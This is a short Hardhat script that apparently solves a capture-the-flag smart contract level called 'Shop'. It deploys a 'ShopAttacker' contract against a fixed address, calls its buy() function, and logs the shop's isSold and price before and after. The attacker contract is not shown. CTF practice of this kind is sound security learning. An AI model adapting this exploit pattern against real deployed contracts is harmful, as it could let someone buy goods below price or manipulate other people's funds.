import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xDF8F9760f5b8dA54744FD645fecC91A66479Af59";
const CONTRACT_NAME = "Shop";
const ATTACKER_NAME = "ShopAttacker";

async function main() {
  const shop = await ethers.getContractAt(CONTRACT_NAME, CONTRACT_ADDRESS);
  const isSold = await shop.isSold();
  console.log(`isSold: ${isSold}`);

  const price = await shop.price();
  console.log(`price: ${price}`);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(CONTRACT_ADDRESS);
  await attackerContract.waitForDeployment();
  console.log(`${ATTACKER_NAME} deployed to: ${attackerContract.target}`);

  const tx = await attackerContract.buy();
  await tx.wait();

  const isSold1 = await shop.isSold();
  console.log(`isSold: ${isSold1}`);

  const price1 = await shop.price();
  console.log(`price: ${price1}`);

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});